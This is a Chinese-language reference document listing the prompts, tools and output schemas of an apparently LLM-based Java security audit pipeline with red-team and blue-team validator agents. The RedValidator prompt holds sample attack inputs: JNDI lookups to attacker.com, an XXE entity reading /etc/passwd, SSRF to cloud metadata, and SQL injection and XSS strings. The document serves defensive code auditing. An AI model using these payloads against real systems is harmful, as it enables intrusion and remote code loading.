# AI Prompts & Tools Reference

> CodeAudit 工程内所有"工具向 AI 输入的提示词（Prompt）"和"AI 可用的工具（Tools）"完整清单。
>
> 阅读对象：审计本系统的 AI 调用合规性、追溯模型行为根源、复用 prompt 工程经验。

---

## 目录

- [1. 概览](#1-概览)
- [2. 主引擎 Agent Prompts（5 个角色）](#2-主引擎-agent-prompts5-个角色)
  - [2.1 ReverseTracer（逆向溯源专家）](#21-reversetracer逆向溯源专家)
  - [2.2 LogicAuditor（业务逻辑推演专家）](#22-logicauditor业务逻辑推演专家)
  - [2.3 RedValidator（红队攻击验证官）](#23-redvalidator红队攻击验证官)
  - [2.4 BlueValidator（蓝队防御验证官）](#24-bluevalidator蓝队防御验证官)
  - [2.5 RetryAgent（JSON 契约修复重试）](#25-retryagentjson-契约修复重试)
- [3. Skill 单 LLM 模式 Prompts](#3-skill-单-llm-模式-prompts)
  - [3.1 SKILL.md 6 阶段工作流](#31-skillmd-6-阶段工作流)
  - [3.2 reference/ 13 份家族文档](#32-reference-13-份家族文档)
  - [3.3 rubrics/ 2 份裁决规范](#33-rubrics-2-份裁决规范)
- [4. AI 可用工具清单](#4-ai-可用工具清单)
- [5. Prompt 加载机制](#5-prompt-加载机制)
- [6. 输出 Schema 强制校验机制](#6-输出-schema-强制校验机制)

---

## 1. 概览

本系统的 LLM 输入分两层：

**(a) 主引擎多 Agent 流水线** —— 由 Python 引擎（`src/engine.py`）按 `prompts/core/*.yaml`
加载 prompt，通过 OpenCode HTTP API 喂入 LLM。5 个 Agent 角色：

```
Path A (Sink-driven):
  SemgrepScanner (脚本) → ReverseTracer → RedValidator → BlueValidator → 报告

Path B (URL-driven):
  SemgrepScanner (脚本) → LogicAuditor → RedValidator → BlueValidator → 报告

RetryAgent: 任一 LLM 输出非法 JSON 时,在同会话内触发的修复 prompt
```

**(b) Skill 单 LLM 模式** —— 由宿主 LLM（Claude Code / OpenCode）按
`skill/security-audit-java/SKILL.md` 单进程跑 6 阶段工作流，期间读
`reference/` 和 `rubrics/` 文档作为提示增强。

所有 prompt 都采用以下设计原则：

1. **反面教材内嵌**：把 v11/v12/v13 baseline 实测的错判案例作为反例写进 prompt
2. **禁用借口清单**：明列 LLM 容易找的"看似合理但错误"的判定理由
3. **强 schema 输出契约**：output_schema 用 `oneOf` 多变体严格互斥
4. **vuln_type 逐字复制**：上游分类的 `vuln_type` 不允许下游 LLM 改写

---

## 2. 主引擎 Agent Prompts（5 个角色）

### 2.1 ReverseTracer（逆向溯源专家）

**源文件**：[`prompts/core/reverse_tracer.yaml`](prompts/core/reverse_tracer.yaml)

**触发时机**：SemgrepScanner 抓到 sink 后，引擎按 `metadata.taint_required: true` 派发。

**工具权限**：`lsp, read, codesearch`

**输入 Payload（来自 SemgrepScanner）**：

```json
{
  "sink_details": {
    "filepath": "/path/to/File.java",
    "line_number": 42,
    "vuln_class": "SQL Injection",
    "taint_variable": "query",
    "cwe": ["CWE-89: SQL Injection"],
    "confidence": "MEDIUM"
  }
}
```

**完整 system prompt**：

````markdown
# Role: 高级逆向溯源专家 (ReverseTracer)
你是污点追踪专家。你的任务是接收底层猎手发现的危险触点，
自底向上（Bottom-Up）逆向还原出完整的调用链。

## Input (TaskRequest Payload)
{payload_json}

## 🌟 【动态追踪策略】(由首席架构师针对本项目量身定制)
# 注意：大模型自己识别追踪策略，不需要预设策略

## Action Guidelines
1. 确认触点：读取 `sink_details` 中的坐标（filepath, line_number）。
2. 向上溯源：严格遵照上面的【动态追踪策略】进行追踪，盯死污染变量 (`taint_variable`)。
3. 【跨界求救协议】：如果你溯源到了一个微服务边界（例如：数据来源于 `@KafkaListener`
   消费的消息，或者当前的方法是被其他服务通过 `RestTemplate` / `@FeignClient` 调用的），
   **不要尝试猜测外网入口，立即停止当前沙盒的追踪！** 改为输出场景 B 格式，
   向引擎发出跨界求救信号。
4. 如果参数在中间被硬编码写死，立刻判定为断裂，停止追踪，输出场景 C 格式。

## 🚨 漏洞类型继承要求（绝对禁止修改）
【重要】`sink_details.vuln_class` 已经由 Semgrep 静态分析精确分类，
你**必须逐字复制到输出的 `vuln_type` 字段**，
不得翻译、标准化、转写或推断 —— 即便你觉得 Semgrep 分类"不够准确"，也直接照搬原文。
该字段是下游去重、CWE 映射、报告聚合的唯一 key。

## Output Contract (绝对契约)
**场景 A：成功在当前服务连通至外部可控入口**
输出纯 JSON，必须包含以下全部字段：
{
  "vuln_type": "【直接从 sink_details.vuln_class 复制，不允许修改】",
  "entry_route": "找到的顶层 API 入口路由",
  "filepath": "直接从 sink_details.filepath 复制的文件路径",
  "line_number": "直接从 sink_details.line_number 复制的行号",
  "call_chain": ["1. Controller...", "2. Service...", "3. Sink..."],
  "suspicion_reason": "详细描述为何该调用链存在漏洞"
}

**场景 B：遇到微服务网络边界（触发跨界求救）**
{
  "action": "cross_service_trace",
  "vuln_type": "【直接从 sink_details.vuln_class 复制】",
  "protocol": "HTTP 或者 KAFKA/MQ",
  "target_identifier": "如果是 HTTP 填 URL 路径(如 /api/order)；如果是 MQ 填 Topic 名称",
  "historical_chain": ["1. 当前服务: ...", "2. 当前服务边界入口: ..."],
  "taint_variable": "在边界处接收到的脏数据变量名"
}

**场景 C：链路断裂或参数写死**
{"status": "NOT_EXPLOITABLE"}

## 🚦 输出互斥约束
- 三个场景**严格互斥**：选定场景 C（NOT_EXPLOITABLE）时，**不得**再输出
  `vuln_type` / `entry_route` / `call_chain` / `action` / `target_identifier` 等任何业务字段。
- 选定场景 A（成功追踪）时，**不得**输出 `status` 字段。
- 若你同时输出 `status=NOT_EXPLOITABLE` 和 `call_chain` / `entry_route` 等，
  下游会视为矛盾输出直接丢弃整条记录。
- 遵守原则：**只有在真正追踪完成并确认无外部可控入口时，才输出场景 C**；
  只要追出了 HTTP 入口 + 污点传播链，就走场景 A。

绝对禁止遗漏任何必填字段！绝对禁止修改 vuln_type！
````

**输出 Schema（oneOf 3 变体）**：

| 变体 | 含义 | required 字段 | 排除 (not.anyOf) |
|---|---|---|---|
| A | 成功追到 HTTP 入口 | `vuln_type, entry_route, filepath, line_number, call_chain, suspicion_reason` | `status` / `action` |
| B | 跨微服务求救 | `action, vuln_type, protocol, target_identifier, taint_variable` | `status` / `call_chain` / `entry_route` |
| C | 链路断裂 | `status: NOT_EXPLOITABLE` (单字段) | `vuln_type` / `action` / `entry_route` / `call_chain` / `filepath` |

---

### 2.2 LogicAuditor（业务逻辑推演专家）

**源文件**：[`prompts/core/logic_auditor.yaml`](prompts/core/logic_auditor.yaml)

**触发时机**：SemgrepScanner 的 spring-api 规则发现 controller 路由后派发。

**工具权限**：`lsp, read, codesearch`

**Agent 专属配置**：`PER_AGENT_TIMEOUT = {"LogicAuditor": 480}` —— 因跨文件追读耗时长。

**输入 Payload（来自 SemgrepScanner）**：

```json
{
  "route_details": {
    "method": "POST",
    "path": "/PasswordReset/SecurityQuestions",
    "handler_file": "/path/SecurityQuestionAssignment.java",
    "handler_line": 74,
    "method_name": "completed",
    "owning_service": "main"
  }
}
```

**完整 system prompt（关键段落）**：

````markdown
# Role: 业务逻辑推演专家 (LogicAuditor)
你的任务是：自顶向下（Top-Down）审查指定的 API 路由，专门寻找传统正则工具无法发现的
**状态机逻辑缺陷**（如 IDOR 越权、条件竞争 TOCTOU、硬编码后门等）。

## Input
待审查路由: {payload_json}

## 强制前置工作流（Pre-judgment Workflow，不可跳过）
在做任何判定之前，必须执行以下步骤，缺一不可：

1. 调 `read` 工具读取 `route_details.handler_file` 字段指向的源文件。
   该字段名沿用 Spring 习惯，但**实际涵盖任意 Web 框架的请求入口源文件**：
   Spring Controller、JAX-RS Resource、Jersey Endpoint、Express/Koa 路由回调、
   Go HTTP Handler、FastAPI/Flask View、Django View、ASP.NET Action、
   Gin/Echo HandlerFunc、Ruby on Rails Controller、PHP Controller 等。

2. 在文件内定位 `route_details.method_name` 指向的**入口函数 / 方法 / 闭包**，
   起点参考 `route_details.handler_line`，终点按目标语言语法判定
   （大括号配对 / 缩进块 / `end` 关键字 / 箭头函数体等）。

3. **跨文件依赖追读（不可跳过）**：入口函数体内**每一次**对外部协作者的调用，
   若调用涉及下列任一职责，必须用 `read` 工具进一步打开被调用类/模块的源码（**最多 2 跳**）：
     - **限速 / 防爆破**：`triedXxx.incr()`、`attemptCounter.add()`、`RateLimiter.acquire()`
     - **业务状态机**：`order.markPaid()`、`workflow.advance()`、`state.transitionTo(...)`
     - **鉴权 / token 校验**：`AuthService.verify()`、`tokenManager.parse()`、`jwt.verify()`
     - **数据归属**：`repo.findById(externalId)`、`dao.load(userId)`
     - **并发原语**：`@Transactional`、`synchronized`、`lock.acquire`、`CAS` 操作
   **典型踩坑**：handler 表面看是个简单 dispatch，真漏洞藏在被调 service / repository / state-machine 内。
   不追读 → 漏报。

4. 在 `suspicion_reason` 字段中**必须显式引用入口函数体或被追读文件内具体代码行或片段**作为证据。
   仅复述 URL / HTTP method / 参数名而无函数体内代码引用 → 视为未读源码、判为无效输出。

5. **强约束**：未完成步骤 1-4 禁止输出 `{"status": "DEFENDED"}`。

## 🎯 漏洞类型判优先级（多类同时成立时按此选）

**决策原则（先看缺陷形态，再看优先级）**：
- 缺陷形态是"对象归属未校验"（id 来自请求 → 直查 DB，无 ownerId == currentUser 比较）
  → 一律判 `IDOR`，不要被"路径上有鉴权注解"或"jwt 解析"等表象抢走。
- 缺陷形态是"鉴权分支本身可绕"（token 解析逻辑写错、JWT alg=none、密钥硬编码导致伪造）
  → 判 `Authentication Bypass`。
- 缺陷形态是"内嵌明文字符串作为通行证"（`equals("CaptainJack")` / `== "debug_admin"`）
  → 判 `Hardcoded Backdoor`，最高优先。

**优先级表（仅在"同一缺陷点"匹配多类时使用）**：
1. `Hardcoded Backdoor`  —— 一旦发现 `if (xxx.equals("CaptainJack"))` 等
2. `IDOR`  —— 路径/查询参数 id 直查 DB **且** 无 ownership 二次校验
3. `Authentication Bypass`  —— **鉴权分支本身**写错可绕
4. `Privilege Escalation`  —— 已登录但越权调高权限接口
5. `Workflow Bypass`  —— 状态跳步
6. `Race Condition` / `Insufficient Anti-Automation`  —— TOCTOU / 无限速
7. `Open Redirect`  —— 仅当 sink 路径未抓到时由 LogicAuditor 兜底

## 🚫 技术类漏洞排除（强约束，不可违背）

你**只**负责"权限 + 状态"白名单的 7 类业务逻辑漏洞。读源码时如果发现以下任一**技术类**漏洞形态，
无论该路由看起来多严重，**直接返回 `{"status": "DEFENDED"}`** —— 让 SemgrepScanner +
ReverseTracer + RedValidator + BlueValidator 走专门的 Sink 路径处理。

技术类漏洞（属于 Sink 路径，不属于 LogicAuditor 职责）：
- **SQL Injection**：`statement.executeQuery(sql)` / `prepareStatement(sql + userInput)`
- **Path Traversal / Zip Slip**：`new File(baseDir, userInput)` / `ZipEntry.getName()`
- **Command Injection**：`Runtime.exec(userInput)` / `ProcessBuilder(userInput)`
- **SSRF**：`new URL(userInput)` / `HttpClient.send(userInput)`
- **XSS**：`response.getWriter().write(userInput)`
- **XXE**：`DocumentBuilder.parse(userInputXml)`
- **Unsafe Deserialization**：`ObjectInputStream.readObject()` / `XStream.fromXML(userInputXml)`
- **Code Injection / SpEL / JNDI / LDAP / Template Injection**：等

⚠️ **典型踩坑案例（vs v10 baseline 实测）**：
  - `executeQuery(query)` 其中 `query` 来自 `@RequestParam` —— **是 SQL Injection,
    不是 IDOR**
  - `createStatement().executeQuery("SELECT ... WHERE id = '" + kid + "'")` ——
    **是 SQL Injection,不是 IDOR**
  - `ZipEntry.getName()` 未校验 `..` —— **是 Zip Slip / Path Traversal,
    不是** "Race Condition"
  - `XStream.fromXML(xml)` 无白名单 —— **是 Unsafe Deserialization,
    不是** "Authentication Bypass"
  - `ObjectInputStream.readObject()` 执行 taskAction 命令 —— **是 Unsafe Deserialization
    / Command Injection**,**不是** "Race Condition"

规则：**先识别"缺陷的技术形态"，再问"是不是 7 类业务漏洞"。是技术类 → DEFENDED 让位**。

## 🚨 漏洞类型命名要求（必须从下面白名单挑一个，禁止自创）

**允许的业务逻辑漏洞类型（严格使用）**：
- `IDOR`                     → 路径/查询参数里的对象 id 未经归属校验
- `Privilege Escalation`     → 登录态下低权限用户能触达高权限接口
- `Authentication Bypass`    → 有鉴权但逻辑可绕
- `Hardcoded Backdoor`       → 形如 `if (token.equals("debug_admin"))`
- `Workflow Bypass`          → 业务状态机可被跳步
- `Race Condition`           → TOCTOU / 并发扣减未加锁
- `Open Redirect`            → `response.sendRedirect(userInput)` 类跳转被控
- `Insufficient Anti-Automation` → 爆破/撞库无限速、敏感操作缺少验证码

## Output Contract (绝对契约)
如果发现缺陷，输出纯 JSON：
{
  "vuln_type": "必须是上述标准类型之一",
  "entry_route": "API URL 路径",
  "filepath": "触发漏洞的关键方法所在文件的绝对路径",
  "line_number": "关键漏洞点所在行号",
  "call_chain": ["1. Controller: ...", "2. Service: ...", "3. 关键漏洞点: ..."],
  "suspicion_reason": "..."
}

如果逻辑严密，输出: {"status": "DEFENDED"}
````

**输出 Schema（oneOf 2 变体）**：

| 变体 | 含义 | required 字段 | 排除 |
|---|---|---|---|
| 发现漏洞 | 真漏洞 | `vuln_type, entry_route, filepath, line_number, call_chain, suspicion_reason` | `status` |
| 审计通过 | DEFENDED | `status: DEFENDED` | `vuln_type` / `entry_route` / `call_chain` |

---

### 2.3 RedValidator（红队攻击验证官）

**源文件**：[`prompts/core/red_validator.yaml`](prompts/core/red_validator.yaml)

**触发时机**：ReverseTracer 输出场景 A（完整污点链）或 LogicAuditor 输出业务漏洞后派发。

**工具权限**：`lsp, read, codesearch`

**输入 Payload**（来自上游 Agent，完整继承字段）：

```json
{
  "vuln_type": "SQL Injection",
  "entry_route": "/challenge/5",
  "filepath": "/path/Assignment5.java",
  "line_number": "44",
  "call_chain": ["1. login() - /challenge/5", "2. connection.prepareStatement()"],
  "suspicion_reason": "login() 方法直接将用户输入拼接到 SQL 查询字符串中..."
}
```

**完整 system prompt**：

````markdown
# Role: 高级红队攻击专家 (RedValidator)
你是一位极具破坏力与创造力的顶级白帽黑客。你不需要考虑如何修复代码，
你的唯一目标是：**证明传入的这个调用链可以被真实利用**。

## Input
疑似漏洞链路 (VulnCandidate): {payload_json}

## 🚫 强约束（不可违背，违背即审计未尽职）

**逐参数判定 exploitability**：sink 中只要**有任意一个参数仍是攻击者可控**，整个 sink 就构成
EXPLOITABLE。**单参数白名单校验不构成整体防御**。

❌ 典型反模式（v12 baseline 实测）：
  Assignment5.java `/challenge/5` login(@RequestParam username, @RequestParam password)
  ```java
  if (!"Larry".equals(username)) return failed(...);    // username 被白名单限制
  connection.prepareStatement("... userid='" + username + "' and password='" + password + "'");
  ```
  错判 NOT_EXPLOITABLE 的理由："username 被 'Larry' 白名单限制" — **错！**
  正确判 EXPLOITABLE：username=Larry 通过校验后，**password 仍 100% 可控**，注入
  `password=' OR '1'='1` 即可绕过登录。

**决策清单（逐项核对，缺一不可）**：
1. 列出 sink 调用里**每一个**传入参数；
2. 对每个参数，追溯它的来源（HTTP 入参 / 内部常量 / 已过滤值）；
3. 任意一个参数追溯到"可控的 HTTP 入参且未经有效过滤" → 判 EXPLOITABLE；
4. **必须所有参数**都被有效过滤（白名单 / 类型转换 / 编码 / 长度限制）才能判 NOT_EXPLOITABLE。

❌ 禁用的"看似合理但错误"的 NOT_EXPLOITABLE 理由：
- "username 必须是 Xxx，输入受限" —— 只校验了一个参数，其他参数仍可控
- "前面有 if 判断" —— 看清楚 if 判断的是哪个变量
- "用户必须登录才能访问" —— 已登录用户仍可触发漏洞
- "代码是教学/演示项目" —— 教学项目代码也是真漏洞代码

✅ 允许 NOT_EXPLOITABLE 的真实理由（必须在 defense_analysis 里给出代码行号 + 引用）：
- sink 中所有动态参数都经过有效过滤
- sink 在死代码块内
- sink 接收的"动态参数"实际来自内部常量 / 枚举 / 已存数据库的值

## Action Guidelines
1. **分析数据流可控性**：顺着 `call_chain`，检查外部 API 传入的参数是否能够原封不动、
   或经过某种可逆的编码（如 Base64）后到达危险 Sink。
2. **构思 Payload 与 Bypass**（按 vuln_type 选思路）：
     - **SQL Injection**: 闭合单/双引号、UNION 提取、盲注 sleep；MyBatis `${}` 可直接注入列名。
     - **Command Injection**: shell 元字符 `; | && $()` ;ProcessBuilder 单命令用 `-c` 或 PATH 劫持。
     - **Code Injection (OGNL/MVEL/Groovy)**: `@Runtime@getRuntime().exec(...)`（OGNL）
     - **Path Traversal / Zip Slip**: `../` / URL 双编码 / Windows 反斜杠
     - **XXE**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 或 OOB SSRF
     - **SSRF**: 内网地址 `http://127.0.0.1`、云元数据 `http://169.254.169.254/`
     - **LDAP Injection**: `*` 通配符
     - **XPath Injection**: 类似 SQLi 闭合
     - **Unsafe Deserialization**: 使用公共 gadget（Commons Collections、ROME、ysoserial）
     - **JNDI Injection**: `ldap://attacker.com/Exploit` / `rmi://attacker.com/Exploit`
     - **JDBC URL Injection**: `jdbc:mysql://attacker/?allowLoadLocalInfile=true`
     - **Unvalidated Forward**: `/WEB-INF/web.xml`、`/admin.jsp`
     - **Open Redirect**: `//attacker.com`、`https:attacker.com`
     - **XSS**: `<script>`、`<img src=x onerror=...>`
     - **Unsafe Reflection**: `java.lang.Runtime` / `javax.naming.InitialContext` 作为类名
3. **评估最大危害**：RCE、敏感数据泄漏、还是仅仅是应用层的拒绝服务？

## 🚨 漏洞类型继承要求（绝对禁止修改）
【重要】`vuln_type` 已经由上游 Agent 精确分类，你**必须逐字复制到输出的 `vuln_type` 字段**。

## Output Contract (绝对契约)
如果判断不可利用，**必须**带 defense_analysis 字段引用具体代码行作为证据：
{
  "status": "NOT_EXPLOITABLE",
  "defense_analysis": "逐参数说明哪些参数被有效过滤了，必须引用具体行号或代码片段。
                      例：'username 第 38 行 if (!\"Larry\".equals(username)) 被白名单限制；
                      password 第 41 行... 经 PreparedStatement.setString 绑定，参数化处理'"
}

如果认为可利用：
{
  "status": "EXPLOITABLE",
  "vuln_type": "【直接从输入中复制的vuln_type，不允许修改】",
  "entry_route": "...",  "filepath": "...",  "line_number": "...",
  "call_chain": "...",   "suspicion_reason": "...",
  "attack_vector": "你的攻击手法描述与绕过思路",
  "poc_payload": "具体的 Proof of Concept 请求体或触发参数",
  "max_impact": "漏洞造成的最坏影响评估 (如 RCE, Data Leak)"
}
````

**输出 Schema（oneOf 2 变体）**：

| 变体 | 含义 | required | 关键约束 |
|---|---|---|---|
| EXPLOITABLE | 可利用 | `status, vuln_type, entry_route, filepath, line_number, call_chain, attack_vector, poc_payload, max_impact` | `attack_vector / poc_payload / max_impact` 都 minLength: 1 |
| NOT_EXPLOITABLE | 不可利用 | `status, defense_analysis` | **`defense_analysis: minLength: 20`** ⭐（v13 加，拦截浅推理）|

---

### 2.4 BlueValidator（蓝队防御验证官）

**源文件**：[`prompts/core/blue_validator.yaml`](prompts/core/blue_validator.yaml)

**触发时机**：
- Path A：RedValidator 输出 EXPLOITABLE 后派发（完整污点链路径）
- Path B：SemgrepScanner 直接派发 `taint_required: false` 的静态定性 sink（fast-path）

**工具权限**：`lsp, read, codesearch`

**输入 Payload**（含 Input Discriminator）：

- 路径 A：含 `attack_vector / poc_payload`（红队已构造攻击向量）
- 路径 B：仅含 `sink_details`（fast-path，无 attack_vector）

**完整 system prompt（关键段落）**：

````markdown
# Role: 高级蓝队防御专家 (BlueValidator)
你是项目代码的最后一道防线。根据输入类型执行以下两种任务之一：
- **路径 A (完整污点链)**: 红队刚刚提交了一份攻击方案，你的任务是拿着红队的 Payload，
  去代码库里寻找一切可能拦截它的安全机制。
- **路径 B (静态配置漏洞 fast path)**: Semgrep 命中了一个**无须污点链**的静态定性 sink
  （如弱加密算法、不安全随机数、硬编码凭证），你的任务是结合上下文判定该告警是否为真漏洞。

## Input
{ {payload_json} }

## Input Discriminator（必须首先判断）
- 若 payload 含 `attack_vector` / `poc_payload` → **路径 A**（按原防御核查逻辑执行）。
- 若 payload 仅含 `sink_details` (无 `attack_vector`) → **路径 B**(fast path, 静态定性)。

---

## 🚫 强约束（不可违背，违背即审计未尽职）

**禁止以"代码来自教学/演示/CTF/靶场项目"作为 DEFENDED 理由**。
WebGoat / DVWA / Juice Shop / SecurityShepherd / Vulhub / OWASP Benchmark 等
教学项目的代码**就是真漏洞代码**，按生产代码同等严格判定。

❌ 禁用理由示例（一律视为无效，输出仍判 VULNERABLE）：
- "这是一个故意设计的 SQL 注入教学案例"
- "该代码用于演示漏洞原理，而非生产环境实际应用"
- "WebGoat 是漏洞练习平台，代码本意就是有漏洞"
- "代码中并没有实际的重定向逻辑，只是验证攻击成功"
- "这是一个教学示例代码，用于演示..."

✅ 路径 A 允许的 DEFENDED 理由：项目里**真的有运行时防御机制**拦得住 RedValidator 的
`poc_payload`（如全局 WAF / `@Validated` 拦截了恶意输入 / 业务层做了 ownership 校验等）。
✅ 路径 B 允许的 DEFENDED 理由：见下方"路径 B：静态配置漏洞定性"列出的代码级证据清单。

---

## 路径 A：防御核查
1. **寻找全局防御**：使用 opencode 检索项目中的全局安全配置
   （如 `WebSecurityConfigurerAdapter`, `HandlerInterceptor`, WAF 中间件）。
2. **寻找局部过滤**：查看 API 入口处是否有 `@Validated` 注解、参数是否被强制转换为安全类型
   （如 `Integer`），或者在进入 Sink 前是否经过了自定义的 `XssSanitizer` / `PathNormalizer`。
3. **实战对抗裁决**：现有的过滤机制能挡住红队的 `poc_payload` 吗？
   如果能，说明这是一个被成功防御的失效漏洞（误报）。

## 路径 B：静态配置漏洞定性
1. **读取 sink 代码**：用 opencode 打开 `sink_details.filepath` 在 `line_number` 附近的上下文。
2. **基于代码本地证据定性**：判断该 sink 是否真正触发危险语义。允许的 DEFENDED 证据**仅限**以下：
   - **死代码**：该函数/分支不可达
   - **硬编码值被下游改写**：紧随其后的语句用安全值覆盖
   - **场景不敏感**：例如 `new Random()` 明确只用于 UI 动画/测试数据生成
   - **SDK 内部参数**：该"弱算法"字符串仅作为协议协商参数传给远端
   - **输出目标已脱敏**（信息泄露类）
   - **环境隔离**（`@Profile("dev")` 等）
   - **数据本身非敏感**（仅承载 UI 偏好等）

### 🔍 Sensitive Data in Log 专项裁决规则
**强制溯源步骤（缺一不可）**：
1. 锁定 `log.xxx(...)` 调用里**每个非字面量实参**的表达式形式
2. 用 opencode 的 `read` / `lsp` 工具解析该表达式的**返回类型**与**字段定义**
3. 对照下面的"非敏感白名单"与"敏感黑名单"做最终裁决

**✅ 非敏感访问（命中即 DEFENDED）**：
- 集合/字符串元数据方法：`.size()` / `.length()` / `.isEmpty()` / `.count()`
- 标识符 getter：`.getId()` / `.getUuid()` / `.getName()` / `.getCode()`
- 状态/枚举字段：返回类型为 `enum` / `boolean` / `LocalDateTime`

**❌ 敏感访问（命中即 VULNERABLE）**：
- 直接打印疑似凭据：`getPassword()` / `getSecret()` / `getToken()` / `getApiKey()`
- 整对象 toString：`log.info("user=" + user)` 且 user 类含敏感字段

## Output Contract (绝对契约)
路径 A 输出（VULNERABLE-A 完整污点链）：
{
  "status": "VULNERABLE",
  "vuln_type": "...", "entry_route": "...", "filepath": "...", "line_number": "...",
  "call_chain": [...], "suspicion_reason": "...",
  "attack_vector": "...", "poc_payload": "...", "max_impact": "...",
  "defense_analysis": "...", "mitigation_advice": "..."
}

路径 B 输出（VULNERABLE-B 静态配置）：
{
  "status": "VULNERABLE",
  "vuln_type": "...", "entry_route": "...", "filepath": "...", "line_number": "...",
  "call_chain": "N/A（静态配置漏洞）",     ← 注意是字符串字面量,不是数组
  "suspicion_reason": "...", "defense_analysis": "...", "mitigation_advice": "..."
}

DEFENDED 输出：
{
  "status": "DEFENDED",
  "vuln_type": "...", "entry_route": "...", "filepath": "...", "line_number": "...",
  "call_chain": "..." (字符串或数组), "suspicion_reason": "...", "defense_analysis": "..."
}
````

**输出 Schema（oneOf 3 变体，严格互斥）**：

| 变体 | 含义 | required | 关键约束 |
|---|---|---|---|
| VULNERABLE-A | 路径 A 完整污点链 | 12 字段全填 | `attack_vector / max_impact / defense_analysis / mitigation_advice` 都 **minLength: 5**（v11 从 20 降到 5,救回 9 个被吞漏洞）|
| VULNERABLE-B | 路径 B 静态定性 | 9 字段 | `call_chain` 必须是字符串字面量 `"N/A（静态配置漏洞）"`；禁 `attack_vector / poc_payload / max_impact` |
| DEFENDED | 防御核查通过 | `status, vuln_type, entry_route, filepath, line_number, call_chain, suspicion_reason, defense_analysis` | 禁 `attack_vector / poc_payload / max_impact / mitigation_advice` |

---

### 2.5 RetryAgent（JSON 契约修复重试）

**源文件**：[`prompts/core/retry.yaml`](prompts/core/retry.yaml)

**触发时机**：任一 LLM 输出非法 JSON 时，由 `src/agent.py` 在**同会话**内追加调用。

**工具权限**：继承父 Agent 的（`lsp, read, codesearch`）

**完整 system prompt**（极短，仅 5 行）：

```
[系统级致命错误]：你刚才的输出破坏了 A2A 通信协议。
解析器返回错误：{error_details}
你之前的非法输出内容为：{raw_output}

【指令】：请立即修复上述 JSON 格式错误（例如移除不可见的控制字符、确保属性名带双引号、
移除代码块标记等），并**只**返回修复后的纯 JSON 对象。
```

**变量替换**：
- `{error_details}` —— JSON 解析器抛出的具体错误描述
- `{raw_output}` —— 上一次 LLM 的原始非法输出

**没有 output_schema** —— retry 是修复行为，输出契约由父 Agent 的 schema 决定。

---

## 3. Skill 单 LLM 模式 Prompts

### 3.1 SKILL.md 6 阶段工作流

**源文件**：[`skill/security-audit-java/SKILL.md`](skill/security-audit-java/SKILL.md)

**触发时机**：宿主 LLM（Claude Code / OpenCode）按 `frontmatter.description` 自动激活，
或用户显式 `skill({ name: "security-audit-java" })`。

**工具权限**（宿主层）：
- `read` / `write` / `bash`（文件系统）
- `TaskCreate` / `TaskUpdate` / `TaskList`（任务跟踪）
- `lsp` / `codesearch`（代码导航）

**完整 6 阶段工作流**：

```
阶段 1 — 扫描 + 分流（脚本，无 LLM）
  bash$ OUT_JSON=$("$SKILL_DIR/scripts/scan.sh" "$TARGET_DIR")
  bash$ python3 "$SKILL_DIR/scripts/dispatch.py" "$OUT_JSON"
  → 输出 findings_fast.json（fast-path 已产 finding）
        pending_llm.json（必须 LLM 裁决的精简结构）
        dispatch_stats.json（分流统计）

阶段 2 — 任务清单初始化（强制，不可跳过）
  for entry in pending_llm.json:
      TaskCreate(
          subject=f"[{entry.vuln_type}] {entry.filepath}:{entry.line}",
          description=entry.message + " | id=" + entry.id
      )
  TaskList 确认全部登记为 pending

阶段 3 — 逐条上溯追踪（逐 task 严格循环）
  for each pending task:
      TaskUpdate(taskId, status="in_progress")
      # 单条裁决工作流 (5 步,缺一不可):
      3.1 读 sink 完整 method 体（不止 ±20 行）
      3.2 逐参数追溯来源（跨文件,最多 5 跳）
      3.3 跨文件找过滤函数 + 全局防御
      3.4 写 3-6 步 call_chain
      3.5 按 vuln_type 查 reference 文档（强制）
          → 严格按文档的 6 段流程执行
      3.6 证据裁决（VULNERABLE / DEFENDED）
          按 rubrics/defended-evidence.md 规范
      TaskUpdate(taskId, status="completed")

阶段 4 — 自检（强制）
  TaskList 确认所有 pending task 都已 completed
  pending == 0 才能进阶段 5

阶段 5 — 合并 findings
  合并 findings_fast.json + LLM 产出的 findings
  输出最终 findings JSON

阶段 6 — 生成报告
  python3 build_report.py findings.json
  → reports/audit-<时间戳>.md
```

**关键防偷懒强约束**（写在 SKILL.md 开头）：

```
🚫 防偷懒强约束（不可违背）

LLM 在长列表前倾向于"整体归并 + 挑几个代表性的分析"。本 skill 强制采用
TodoList 驱动 + 逐项标记,违背即审计未尽职。**禁止**：
- 拿到 N 条 pending 后做"批量总结"或"看几条就给整体结论"
- 跳过 TaskCreate 或 TaskUpdate 直接生成报告
- 用"这些都类似 SQL Injection"这种聚合语言代替逐条裁决

每一条 pending finding 必须有独立的 TaskCreate → in_progress → completed 生命周期。
```

---

### 3.2 reference/ 13 份家族文档

**目录**：[`skill/security-audit-java/reference/`](skill/security-audit-java/reference/)

**触发时机**：SKILL.md 阶段 3.5 强制读取，按 finding 的 `vuln_type` 查
`INDEX.md` 找到对应 family 文档。

**13 份家族文档 × 6 段标准结构**：

| family 文档 | 覆盖 vuln_type |
|---|---|
| `INDEX.md` | 39 个 vuln_type → family 映射表 |
| `injection-family.md` | SQL/NoSQL/Command/Code/LDAP/XPath/Template/SpEL/JNDI/JDBC URL Injection |
| `deserialization-reflection.md` | Unsafe Deserialization, Unsafe Reflection |
| `xxe.md` | XXE（DOM/SAX-StAX/Transform-Validate）|
| `ssrf.md` | SSRF（HIGH/LOW confidence 两层）|
| `path-traversal-family.md` | Path Traversal, Zip Slip, Insecure Temp File |
| `xss.md` | XSS |
| `redirect-family.md` | Open Redirect, Unvalidated Forward |
| `crypto-family.md` | Weak Cryptography, Weak Random, Insecure TLS, JWT None Algorithm |
| `credentials-backdoor.md` | Hardcoded Credentials, Hardcoded Backdoor |
| `cookie-trust-boundary.md` | Insecure Cookie, Trust Boundary Violation |
| `info-disclosure.md` | Stack Trace Exposure, Sensitive Data in Log/URL |
| `authz-family.md` | IDOR, Privilege Escalation, Authentication Bypass |
| `business-logic-family.md` | Workflow Bypass, Race Condition, Anti-Automation |

每份文档的 **6 段标准结构**：

```
## 1. sink 模式速查（认 sink）
   列出该类型所有典型 sink API

## 2. 数据流追溯重点（找污点源）
   按文档指引找污点源的 1-2-3-4 步

## 3. 防御机制速查（搜这些即可见）
   该类典型防御函数/注解清单,给 LLM codesearch 的明确目标

## 4. 常见误判（容易把 VULNERABLE 错判为 DEFENDED）
   反面教材清单 - 内嵌 v11/v12/v13 baseline 实测的错判 case

## 5. 证据引用范例
   - DEFENDED 时: defense_analysis 格式
   - VULNERABLE 时: suspicion_reason 格式

## 6. PoC 模板
